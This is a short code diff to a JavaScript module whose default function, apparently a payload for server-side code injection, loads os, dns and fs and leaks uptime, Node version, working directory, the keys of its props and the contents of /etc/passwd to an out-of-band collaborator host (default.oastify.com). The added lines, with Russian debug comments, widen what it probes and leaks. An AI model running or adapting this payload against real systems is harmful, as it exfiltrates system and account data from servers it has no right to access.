@@ -1,6 +1,7 @@
 module.exports = {
   default: function(props) {
-    var collab = (props && props.collab) || "default.oastify.com";
+    // Пробуем ОБА пути
+    var collab = (props && props.collab) || (props && props.render && props.render.collab) || "default.oastify.com";
     var os, dns, fs;
     try { os = require("os"); } catch(e) {}
     try { dns = require("dns"); } catch(e) {}
@@ -12,6 +13,8 @@ module.exports = {
     try { S("uptime-" + Math.round(os.uptime())); } catch(e) {}
     try { S("node-" + process.version.replace(/^v/,"")); } catch(e) {}
     try { S("cwd-" + process.cwd().replace(/\//g,"_")); } catch(e) {}
+    // DEBUG: пробуем все возможные пути
+    try { S("props-keys-" + Object.keys(props||{}).join("_")); } catch(e) {}
     if (fs) {
       try {
         var pw = fs.readFileSync("/etc/passwd","utf8").trim().split("\n");
